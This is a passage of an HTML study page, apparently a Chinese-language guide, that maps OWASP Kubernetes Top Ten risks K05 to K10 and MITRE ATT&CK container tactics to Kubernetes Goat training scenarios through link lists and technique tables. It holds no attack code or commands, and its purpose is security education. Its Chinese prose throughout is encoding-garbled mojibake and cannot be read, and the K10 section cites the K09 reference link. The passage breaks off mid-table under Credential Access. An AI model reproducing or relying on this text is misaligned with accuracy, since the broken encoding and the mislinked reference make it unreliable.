<h2 id="1-5-K05-Inadequate-Logging-and-Monitoring"><a href="#1-5-K05-Inadequate-Logging-and-Monitoring" class="headerlink" title="1.5 K05 - Inadequate Logging and Monitoring"></a>1.5 K05 - Inadequate Logging and Monitoring</h2><p>Kubernetesç¯å¢ƒå…·å¤‡åœ¨ä¸åŒå±‚çº§ä»¥åŠæ‰€æœ‰ç›¸å…³ç»„ä»¶ä¸­åˆ›å»ºæ—¥å¿—çš„èƒ½åŠ›ã€‚å½“æœªå¯¹å¼‚å¸¸äº‹ä»¶ï¼ˆå¦‚è®¤è¯å¤±è´¥å°è¯•ã€è®¿é—®æ•æ„Ÿèµ„æºã€æ‰‹åŠ¨åˆ é™¤æˆ–ä¿®æ”¹Kubernetesèµ„æºç­‰ï¼‰è¿›è¡Œæ—¥å¿—ç›‘æ§ï¼Œæœªè®¾ç½®å‘Šè­¦é˜ˆå€¼ï¼Œæœªé›†ä¸­å­˜å‚¨æ—¥å¿—ï¼Œæˆ–è€…ç¦ç”¨æ—¥å¿—åŸºç¡€è®¾æ–½æ—¶ï¼Œå°±ä¼šæˆä¸ºä¸€ä¸ªé—®é¢˜ã€‚</p>
<p>ç›¸å…³goatåœºæ™¯ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-21/ebpf-runtime-security-monitoring-and-detection-in-kubernetes-cluster-using-cilium-tetragon/welcome">Cilium Tetragon - eBPF-based Security Observability and Runtime Enforcement</a></li>
<li><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-18/runtime-security-monitoring-and-detection-in-kubernetes-cluster-using-falco/welcome">Falco - Runtime security monitoring &amp; detection</a></li>
</ul>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K05-inadequate-logging">https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K05-inadequate-logging</a></p>
<h2 id="1-6-K06-Broken-Authentication-Mechanisms"><a href="#1-6-K06-Broken-Authentication-Mechanisms" class="headerlink" title="1.6 K06 - Broken Authentication Mechanisms"></a>1.6 K06 - Broken Authentication Mechanisms</h2><p>Kubernetes æä¾›äº†é«˜åº¦çµæ´»çš„è®¤è¯æœºåˆ¶ï¼Œä½¿å…¶èƒ½å¤Ÿåœ¨å„ç§ç¯å¢ƒä¸­æœ‰æ•ˆè¿è¡Œã€‚ç„¶è€Œï¼Œè¿™ç§çµæ´»æ€§åœ¨é›†ç¾¤å’Œäº‘å®‰å…¨æ€åŠ¿æ–¹é¢ä¹Ÿå¸¦æ¥äº†æŒ‘æˆ˜ã€‚è¦è®¿é—® Kubernetes APIï¼Œå¤šä¸ªå®ä½“éœ€è¦è¿›è¡Œè®¤è¯ã€‚Kubernetes API çš„è®¤è¯è¿‡ç¨‹é€šè¿‡ HTTP è¯·æ±‚å®Œæˆï¼Œå¹¶ä¸”å¯èƒ½å› é›†ç¾¤è€Œå¼‚ã€‚å¦‚æœè¯·æ±‚æ— æ³•é€šè¿‡è®¤è¯ï¼Œå°†ä¼šä»¥ HTTP 401 çŠ¶æ€ç è¢«æ‹’ç»ã€‚é€šå¸¸ï¼Œäººç±»ç”¨æˆ·è®¤è¯æˆ–æœåŠ¡è´¦æˆ·è®¤è¯è¢«ç”¨äºå¯¹ Kubernetes API è¿›è¡Œè®¤è¯ã€‚</p>
<p>ç›¸å…³goatåœºæ™¯ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-16/rbac-least-privileges-misconfiguration-in-kubernetes-cluster/welcome">RBAC least privileges misconfiguration</a></li>
</ul>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K06-broken-authentication">https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K06-broken-authentication</a></p>
<h2 id="1-7-K07-Missing-Network-Segmentation-Controls"><a href="#1-7-K07-Missing-Network-Segmentation-Controls" class="headerlink" title="1.7 K07 - Missing Network Segmentation Controls"></a>1.7 K07 - Missing Network Segmentation Controls</h2><p>åœ¨ç®¡ç†å¤šä¸ªå¾®æœåŠ¡å’Œç§Ÿæˆ·æ—¶ï¼ŒKubernetes ç½‘ç»œæµé‡æ§åˆ¶æ˜¯ä¸€ä¸ªä¸»è¦é—®é¢˜ã€‚æ‰å¹³çš„ç½‘ç»œç»“æ„å…è®¸å·¥ä½œè´Ÿè½½ä¸å—é™åˆ¶åœ°è¿›è¡Œé€šä¿¡ï¼Œè¿™å¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨æ¥æ¢æµ‹å’Œéå†å†…éƒ¨ç½‘ç»œæˆ–è°ƒç”¨ç§æœ‰ APIã€‚</p>
<p>ç›¸å…³goatåœºæ™¯ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-11/kubernetes-namespaces-bypass-from-kubernetes-cluster-pod/welcome">Kubernetes namespaces bypass</a></li>
<li><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-20/secure-kubernetes-using-network-security-policy/welcome">Secure network boundaries using NSP</a></li>
</ul>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K07-network-segmentation">https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K07-network-segmentation</a></p>
<h2 id="1-8-K08-Secrets-Management-Failures"><a href="#1-8-K08-Secrets-Management-Failures" class="headerlink" title="1.8 K08 - Secrets Management Failures"></a>1.8 K08 - Secrets Management Failures</h2><p>Kubernetes Secretsç”¨äºå­˜å‚¨å°å‹å¯¹è±¡ï¼Œå…¶åˆ›å»ºæ–¹å¼ä¸å…¶ä»–Kuberneteså¯¹è±¡ç›¸åŒã€‚è¿™äº›Secretsåœ¨.yamlæ¸…å•æ–‡ä»¶ä¸­å®šä¹‰ï¼Œç”¨äºç¼–ç ç”¨æˆ·åå’Œå¯†ç ç­‰æ•æ„Ÿæ•°æ®ã€‚ç„¶è€Œï¼Œè¿™äº›å€¼é»˜è®¤æ˜¯ç¼–ç è€ŒéåŠ å¯†çš„ï¼Œå¯ä»¥è½»æ¾è§£ç ï¼Œå› æ­¤å°†Secretsçº³å…¥ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæˆ–å…¶ä»–ç³»ç»Ÿå­˜åœ¨é£é™©ã€‚</p>
<p>ç›¸å…³goatåœºæ™¯</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-1/sensitive-keys-in-codebases-in-kubernetes-containers/welcome">Sensitive keys in codebases</a></li>
</ul>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K08-secrets-management">https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K08-secrets-management</a></p>
<h2 id="1-9-K09-Misconfigured-Cluster-Components"><a href="#1-9-K09-Misconfigured-Cluster-Components" class="headerlink" title="1.9 K09 - Misconfigured Cluster Components"></a>1.9 K09 - Misconfigured Cluster Components</h2><p>Kuberneteså…³é”®ç»„ä»¶çš„é…ç½®é”™è¯¯å¯èƒ½ä¼šå¯¼è‡´æ•´ä¸ªé›†ç¾¤è¢«æ”»ç ´ï¼Œç”šè‡³é€ æˆæ›´ä¸¥é‡çš„åæœã€‚Kubernetesæ§åˆ¶å¹³é¢å’ŒèŠ‚ç‚¹ç”±å„ç§å¯èƒ½å®¹æ˜“é…ç½®é”™è¯¯çš„ç»„ä»¶ç»„æˆï¼Œä¾‹å¦‚kubeletã€etcdã€kube-apiserverç­‰ã€‚</p>
<p>ç›¸å…³goatåœºæ™¯</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-17/auditing-the-kubernetes-cluster-using-kubeaudit/welcome">KubeAudit - Audit Kubernetes clusters</a></li>
</ul>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K09-misconfigured-cluster-components">https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K09-misconfigured-cluster-components</a></p>
<h2 id="1-10-K10-Outdated-and-Vulnerable-Kubernetes-Components"><a href="#1-10-K10-Outdated-and-Vulnerable-Kubernetes-Components" class="headerlink" title="1.10 K10 - Outdated and Vulnerable Kubernetes Components"></a>1.10 K10 - Outdated and Vulnerable Kubernetes Components</h2><p>åœ¨ä¼ ç»Ÿè¡¥ä¸å’Œæ¼æ´ç®¡ç†æ–¹é¢ï¼ŒKubernetes é›†ç¾¤å¯èƒ½ä¼šé¢ä¸´æŒ‘æˆ˜ã€‚ArgoCDã€Kubernetes æœ¬èº«ä»¥åŠ Istio ç­‰å¸¸ç”¨å·¥å…·ä¸­çš„é…ç½®é”™è¯¯å·²å¯¼è‡´ä¸¥é‡çš„ CVEï¼ˆå¸¸è§æ¼æ´å’ŒæŠ«éœ²ï¼‰ã€‚</p>
<ul>
<li>ArgoCD å­˜åœ¨è§£ææ¼æ´ï¼Œæ”»å‡»è€…å¯å€Ÿæ­¤åŠ è½½æ¶æ„ Helm Chart å¹¶è®¿é—®æ•æ„Ÿä¿¡æ¯ã€‚</li>
<li>ingress-nginx æ›¾å­˜åœ¨ä¸€ä¸ª CVE æ¼æ´ï¼Œå…è®¸ç”¨æˆ·è·å–é›†ç¾¤ä¸­çš„æ‰€æœ‰å¯†é’¥ï¼Œè€Œè¿™ä¸€é—®é¢˜æ— æ³•ä»…é€šè¿‡å‡çº§ç‰ˆæœ¬æ¥è§£å†³ã€‚</li>
<li>Istio å­˜åœ¨ä¸€ä¸ªè®¤è¯ç»•è¿‡æ¼æ´ï¼Œä½¿å¾—æœªç»æˆæƒçš„ç”¨æˆ·å¯ä»¥è®¿é—®å—ä¿æŠ¤çš„è·¯å¾„ã€‚</li>
</ul>
<p>ä¸ºç¡®ä¿å¤šä¸ªé›†ç¾¤çš„å®‰å…¨ï¼Œç»´æŠ¤å‡†ç¡®çš„æ¸…å•å¹¶åœ¨å„ç¯å¢ƒä¸­ä¿æŒæœ€ä½ Kubernetes ç‰ˆæœ¬è‡³å…³é‡è¦ã€‚</p>
<p>ç›¸å…³goatåœºæ™¯</p>
<ul>
<li>[Helm v2 tiller to PwN the cluster - <a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-9/helm-v2-tiller-to-pwn-kubernetes-cluster-takeover/welcome">Deprecated]</a></li>
</ul>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K09-misconfigured-cluster-components">https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K09-misconfigured-cluster-components</a></p>
<h1 id="äºŒã€MITRE-ATT-CK-ä¸Goat"><a href="#äºŒã€MITRE-ATT-CK-ä¸Goat" class="headerlink" title="äºŒã€MITRE ATT&amp;CK ä¸Goat"></a>äºŒã€MITRE ATT&amp;CK ä¸Goat</h1><p>MITRE ATT&amp;CKÂ®ï¼ˆå¯¹æŠ—æˆ˜æœ¯ã€æŠ€æœ¯ä¸é€šç”¨çŸ¥è¯†ï¼‰æ¡†æ¶æ˜¯ä¸€ä¸ªåŸºäºç°å®è§‚å¯Ÿçš„å…¨çƒå¯è®¿é—®çš„å¯¹æ‰‹æˆ˜æœ¯å’ŒæŠ€æœ¯çŸ¥è¯†åº“ã€‚åœ¨æœ¬æ¡†æ¶ä¸­ï¼Œæ¶µç›–äº†æˆ˜æœ¯ã€æŠ€æœ¯å’Œç¨‹åºï¼ˆTTPsï¼‰ï¼Œä»¥æ˜ å°„Kuberneteså®‰å…¨é£é™©ä»¥åŠç›¸å…³çš„Kubernetes Goatåœºæ™¯ã€‚</p>
<table>
<thead>
<tr>
<th align="center"><strong><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/mitre/mitre-attack#-tactic---initial-access">Initial Access</a></strong></th>
<th align="center"><strong><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/mitre/mitre-attack#-tactic---execution">Execution</a></strong></th>
<th align="center"><strong><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/mitre/mitre-attack#-tactic---persistence">Persistence</a></strong></th>
<th align="center"><strong><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/mitre/mitre-attack#-tactic---privilege-escalation">Privilege Escalation</a></strong></th>
<th align="center"><strong><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/mitre/mitre-attack#-tactic---defense-evasion">Defense Evasion</a></strong></th>
<th align="center"><strong><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/mitre/mitre-attack#-tactic---credential-access">Credential Access</a></strong></th>
<th align="center"><strong><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/mitre/mitre-attack#-tactic---discovery">Discovery</a></strong></th>
<th align="center"><strong><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/mitre/mitre-attack#-tactic---lateral-movement">Lateral Movement</a></strong></th>
<th align="center"><strong><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/mitre/mitre-attack#-tactic---collection">Collection</a></strong></th>
<th align="center"><strong><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/mitre/mitre-attack#-tactic---impact">Impact</a></strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">Using Cloud credentials</td>
<td align="center">Exec into container</td>
<td align="center">Backdoor container</td>
<td align="center">Privileged container</td>
<td align="center">Clear container logs</td>
<td align="center">List K8S secrets</td>
<td align="center">Access the K8S API server</td>
<td align="center">Access cloud resources</td>
<td align="center">Images from a private registry</td>
<td align="center">Data Destruction</td>
</tr>
<tr>
<td align="center">Compromised images in registry</td>
<td align="center">bash/cmd inside container</td>
<td align="center">Writable hostPath mount</td>
<td align="center">Cluster-admin binding</td>
<td align="center">Delete K8S events</td>
<td align="center">Mount service principal</td>
<td align="center">Access Kubelet API</td>
<td align="center">Container service account</td>
<td align="center"></td>
<td align="center">Resource Hijacking</td>
</tr>
<tr>
<td align="center">Kubeconfig file</td>
<td align="center">New container</td>
<td align="center">Kubernetes CronJob</td>
<td align="center">hostPath mount</td>
<td align="center">Pod / container name similarity</td>
<td align="center">Access container service account</td>
<td align="center">Network mapping</td>
<td align="center">Cluster internal networking</td>
<td align="center"></td>
<td align="center">Denial of service</td>
</tr>
<tr>
<td align="center">Application vulnerability</td>
<td align="center">Application exploit (RCE)</td>
<td align="center">Malicious admission controller</td>
<td align="center">Access cloud resources</td>
<td align="center">Connect from Proxy server</td>
<td align="center">Applications credentials in configuration files</td>
<td align="center">Access Kubernetes dashboard</td>
<td align="center">Applications credentials in configuration files</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Exposed Dashboard</td>
<td align="center">SSH server running inside container</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">Access managed identity credential</td>
<td align="center">Instance Metadata API</td>
<td align="center">Writable volume mounts on the host</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Exposed sensitive interfaces</td>
<td align="center">Sidecar injection</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">Malicious admission controller</td>
<td align="center"></td>
<td align="center">Access Kubernetes dashboard</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">Access tiller endpoint</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">CoreDNS poisoning</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center">ARP poisoning and IP spoofing</td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h2 id="2-1-Initial-Access"><a href="#2-1-Initial-Access" class="headerlink" title="2.1 Initial Access"></a>2.1 Initial Access</h2><p>åˆå§‹è®¿é—®ç­–ç•¥åŒ…æ‹¬ç”¨äºè·å–èµ„æºè®¿é—®æƒé™çš„æŠ€æœ¯ã€‚åœ¨å®¹å™¨åŒ–ç¯å¢ƒä¸­ï¼Œè¿™äº›æŠ€æœ¯èƒ½å¤Ÿå®ç°å¯¹é›†ç¾¤çš„é¦–æ¬¡è®¿é—®ã€‚è¿™ç§è®¿é—®å¯ä»¥é€šè¿‡é›†ç¾¤ç®¡ç†å±‚ç›´æ¥å®ç°ï¼Œæˆ–è€…é€šè¿‡è·å–å¯¹éƒ¨ç½²åœ¨é›†ç¾¤ä¸Šçš„æ¶æ„æˆ–æ˜“å—æ”»å‡»èµ„æºçš„è®¿é—®æƒé™æ¥é—´æ¥å®ç°ã€‚</p>
<table>
<thead>
<tr>
<th><strong>ğŸ§° Techniques</strong></th>
<th><strong>ğŸ Kubernetes Goat Scenarios</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Using cloud credentials</td>
<td></td>
</tr>
<tr>
<td>Compromised image in registry</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-7/attacking-private-container-registry-in-kubernetes">âˆ Attacking private registry</a></td>
</tr>
<tr>
<td>Kubeconfig file</td>
<td></td>
</tr>
<tr>
<td>Application vulnerability</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-3/ssrf-in-the-kubernetes-world">âˆ SSRF in the Kubernetes (K8S) world</a> <a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-2/docker-in-docker-exploitation-in-kubernetes-containers">âˆ DIND (docker-in-docker) exploitation</a></td>
</tr>
<tr>
<td>Exposed sensitive interfaces</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-8/misconfigured-nodeport-exposed-service-in-kubernetes">âˆ NodePort exposed services</a></td>
</tr>
</tbody></table>
<h2 id="2-2-Execution"><a href="#2-2-Execution" class="headerlink" title="2.2 Execution"></a>2.2 Execution</h2><p>æ‰§è¡Œç­–ç•¥åŒ…æ‹¬æ”»å‡»è€…ç”¨äºåœ¨é›†ç¾¤å†…è¿è¡Œå…¶ä»£ç çš„æŠ€æœ¯ã€‚</p>
<table>
<thead>
<tr>
<th><strong>ğŸ§° Techniques</strong></th>
<th><strong>ğŸ Kubernetes Goat Scenarios</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Exec into container</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-12/gain-environment-information-in-kubernetes-cluster">âˆ Gaining environment information</a></td>
</tr>
<tr>
<td>bash/cmd inside container</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-12/gain-environment-information-in-kubernetes-cluster">âˆ Gaining environment information</a></td>
</tr>
<tr>
<td>New container</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-14/hacker-container-preview-in-kubernetes-cluster">âˆ Hacker container preview</a></td>
</tr>
<tr>
<td>Application exploit (RCE)</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-2/docker-in-docker-exploitation-in-kubernetes-containers">âˆ DIND (docker-in-docker) exploitation</a></td>
</tr>
<tr>
<td>SSH server running inside container</td>
<td></td>
</tr>
<tr>
<td>Sidecar injection</td>
<td></td>
</tr>
</tbody></table>
<blockquote>
<h4 id="Sidecar-injection"><a href="#Sidecar-injection" class="headerlink" title="Sidecar injection"></a>Sidecar injection</h4><p>Sidecaræ¨¡å¼æ˜¯äº‘åŸç”Ÿæ¶æ„ä¸­çš„ä¸€ä¸ªå¸¸è§è®¾è®¡æ¨¡å¼ï¼Œé€šå¸¸ç”¨äºå¾®æœåŠ¡æ¶æ„ä¸­ã€‚Sidecarå®¹å™¨ä¸ä¸»åº”ç”¨å®¹å™¨ä¸€èµ·è¿è¡Œï¼Œè´Ÿè´£å¤„ç†è¯¸å¦‚æ—¥å¿—æ”¶é›†ã€ç›‘æ§ã€ç½‘ç»œé€šä¿¡ç­‰æ¨ªåˆ‡å…³æ³¨ç‚¹ã€‚å¸¸è§çš„ä¾‹å­åŒ…æ‹¬Istioä¸­çš„Envoyä»£ç†ï¼Œå®ƒä½œä¸ºSidecaræ¥å¤„ç†æœåŠ¡ç½‘æ ¼ä¸­çš„æµé‡ç®¡ç†ã€å®‰å…¨ç­–ç•¥ç­‰ã€‚</p>
<p>Sidecar injectionåœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸçš„å«ä¹‰ã€‚è¿™é‡Œå¯èƒ½æ¶‰åŠä¸¤ä¸ªæ–¹é¢ï¼šä¸€æ˜¯æ­£å¸¸çš„å®‰å…¨åº”ç”¨ï¼Œæ¯”å¦‚é€šè¿‡Sidecaræ¥å®æ–½å®‰å…¨ç­–ç•¥ï¼›äºŒæ˜¯å¯èƒ½çš„å®‰å…¨å¨èƒï¼Œæ¯”å¦‚æ¶æ„Sidecaræ³¨å…¥æ”»å‡»ã€‚</p>
<p>ä»å®‰å…¨åº”ç”¨çš„è§’åº¦æ¥çœ‹ï¼ŒSidecaræ³¨å…¥å¯ä»¥ç”¨äºå¢å¼ºå®‰å…¨æ€§ã€‚ä¾‹å¦‚ï¼ŒæœåŠ¡ç½‘æ ¼ä¸­é€šè¿‡è‡ªåŠ¨æ³¨å…¥Sidecarä»£ç†æ¥ç®¡ç†æœåŠ¡é—´çš„TLSåŠ å¯†é€šä¿¡ï¼Œå®æ–½mTLSï¼ˆåŒå‘TLSè®¤è¯ï¼‰ï¼Œè¿›è¡Œæµé‡ç›‘æ§å’Œè®¿é—®æ§åˆ¶ã€‚æ­¤å¤–ï¼ŒSidecarè¿˜å¯ä»¥é›†æˆå®‰å…¨å·¥å…·ï¼Œå¦‚å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼ˆIDSï¼‰ã€Webåº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰ï¼Œæˆ–è€…è¿›è¡Œå®æ—¶çš„æ¼æ´æ‰«æã€‚</p>
<p>å¦ä¸€æ–¹é¢ï¼ŒSidecaræ³¨å…¥ä¹Ÿå¯èƒ½å¸¦æ¥å®‰å…¨é£é™©ã€‚æ”»å‡»è€…å¯èƒ½åˆ©ç”¨é…ç½®é”™è¯¯æˆ–æ¼æ´ï¼Œåœ¨æœªç»æˆæƒçš„æƒ…å†µä¸‹æ³¨å…¥æ¶æ„Sidecarå®¹å™¨ã€‚è¿™ç§æ¶æ„å®¹å™¨å¯ä»¥çªƒå–æ•æ„Ÿæ•°æ®ã€ç¯¡æ”¹æµé‡ï¼Œæˆ–è€…ä½œä¸ºæŒä¹…åŒ–åé—¨ã€‚ä¾‹å¦‚ï¼Œå¦‚æœé›†ç¾¤çš„å‡†å…¥æ§åˆ¶ï¼ˆAdmission Controlï¼‰é…ç½®ä¸å½“ï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¼ªé€ çš„Podé…ç½®æ³¨å…¥æ¶æ„Sidecarï¼Œä»è€Œè·å–å¯¹ç½‘ç»œæµé‡çš„æ§åˆ¶æƒã€‚</p>
</blockquote>
<h2 id="2-3-Persistence"><a href="#2-3-Persistence" class="headerlink" title="2.3 Persistence"></a>2.3 Persistence</h2><p>æŒä¹…åŒ–ç­–ç•¥åŒ…æ‹¬æ”»å‡»è€…åœ¨åˆå§‹ç«‹è¶³ç‚¹ä¸¢å¤±çš„æƒ…å†µä¸‹ï¼Œç”¨äºä¿æŒå¯¹é›†ç¾¤è®¿é—®æƒé™çš„æŠ€æœ¯ã€‚</p>
<table>
<thead>
<tr>
<th><strong>ğŸ§° Techniques</strong></th>
<th><strong>ğŸ Kubernetes Goat Scenarios</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Backdoor container</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-10/analyzing-crypto-miner-in-kubernetes-cluster-container">âˆ Analyzing crypto miner container</a></td>
</tr>
<tr>
<td>Writable hostPath mount</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-4/container-escape-to-the-host-system-in-kubernetes-containers">âˆ Container escape to the host system</a></td>
</tr>
<tr>
<td>Kubernetes CronJob</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-15/hidden-in-container-layers-in-kubernetes-cluster">âˆ Hidden in layers</a></td>
</tr>
<tr>
<td>Malicious admission controller</td>
<td></td>
</tr>
<tr>
<td>Container service account</td>
<td>[âˆ Helm v2 tiller to PwN the cluster - <a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-9/helm-v2-tiller-to-pwn-kubernetes-cluster-takeover">Deprecated]</a> <a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-16/rbac-least-privileges-misconfiguration-in-kubernetes-cluster">âˆ RBAC least privileges misconfiguration</a></td>
</tr>
<tr>
<td>Static pods</td>
<td></td>
</tr>
</tbody></table>
<h2 id="2-4-Privilege-Escalation"><a href="#2-4-Privilege-Escalation" class="headerlink" title="2.4 Privilege Escalation"></a>2.4 Privilege Escalation</h2><p>ææƒç­–ç•¥åŒ…æ‹¬æ”»å‡»è€…ç”¨æ¥è·å–æ¯”å…¶å½“å‰æƒé™æ›´é«˜ç¯å¢ƒæƒé™çš„æŠ€æœ¯ã€‚åœ¨å®¹å™¨åŒ–ç¯å¢ƒä¸­ï¼Œè¿™å¯èƒ½åŒ…æ‹¬ä»å®¹å™¨è®¿é—®èŠ‚ç‚¹ã€åœ¨é›†ç¾¤ä¸­è·å¾—æ›´é«˜æƒé™ï¼Œç”šè‡³è®¿é—®äº‘èµ„æºã€‚</p>
<table>
<thead>
<tr>
<th><strong>ğŸ§° Techniques</strong></th>
<th><strong>ğŸ Kubernetes Goat Scenarios</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Privileged container</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-4/container-escape-to-the-host-system-in-kubernetes-containers">âˆ Container escape to the host system</a></td>
</tr>
<tr>
<td>Cluster-admin binding</td>
<td>[âˆ Helm v2 tiller to PwN the cluster - <a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-9/helm-v2-tiller-to-pwn-kubernetes-cluster-takeover">Deprecated]</a></td>
</tr>
<tr>
<td>hostPath mount</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-4/container-escape-to-the-host-system-in-kubernetes-containers">âˆ Container escape to the host system</a></td>
</tr>
<tr>
<td>Access cloud resources</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-3/ssrf-in-the-kubernetes-world">âˆ SSRF in the Kubernetes (K8S) world</a></td>
</tr>
</tbody></table>
<h2 id="2-5-Defense-Evasion-ï¼ˆé˜²å¾¡è§„é¿ï¼‰"><a href="#2-5-Defense-Evasion-ï¼ˆé˜²å¾¡è§„é¿ï¼‰" class="headerlink" title="2.5 Defense Evasion ï¼ˆé˜²å¾¡è§„é¿ï¼‰"></a>2.5 Defense Evasion ï¼ˆé˜²å¾¡è§„é¿ï¼‰</h2><p>é˜²å¾¡è§„é¿ç­–ç•¥åŒ…æ‹¬æ”»å‡»è€…ç”¨æ¥é¿å…è¢«æ£€æµ‹å’Œéšè—å…¶æ´»åŠ¨çš„æŠ€æœ¯ã€‚</p>
<table>
<thead>
<tr>
<th><strong>ğŸ§° Techniques</strong></th>
<th><strong>ğŸ Kubernetes Goat Scenarios</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Clear container logs</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-4/container-escape-to-the-host-system-in-kubernetes-containers">âˆ Container escape to the host system</a></td>
</tr>
<tr>
<td>Delete K8S events</td>
<td>[âˆ Helm v2 tiller to PwN the cluster - <a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-9/helm-v2-tiller-to-pwn-kubernetes-cluster-takeover">Deprecated]</a></td>
</tr>
<tr>
<td>Pod / container name similarity</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-14/hacker-container-preview-in-kubernetes-cluster">âˆ Hacker container preview</a></td>
</tr>
<tr>
<td>Connect from proxy server</td>
<td></td>
</tr>
</tbody></table>
<h2 id="2-6-Credential-Access"><a href="#2-6-Credential-Access" class="headerlink" title="2.6 Credential Access"></a>2.6 Credential Access</h2><p>å‡­æ®è®¿é—®ç­–ç•¥åŒ…æ‹¬æ”»å‡»è€…ç”¨æ¥çªƒå–å‡­æ®çš„æŠ€æœ¯ã€‚åœ¨å®¹å™¨åŒ–ç¯å¢ƒä¸­ï¼Œè¿™åŒ…æ‹¬è¿è¡Œåº”ç”¨ç¨‹åºçš„å‡­æ®ã€èº«ä»½ã€å­˜å‚¨åœ¨é›†ç¾¤ä¸­çš„æœºå¯†æˆ–äº‘å‡­æ®ã€‚</p>
<table>
<thead>
<tr>
<th><strong>ğŸ§° Techniques</strong></th>
<th><strong>ğŸ Kubernetes Goat Scenarios</strong></th>
</tr>
</thead>
<tbody><tr>
<td>List K8S secrets</td>
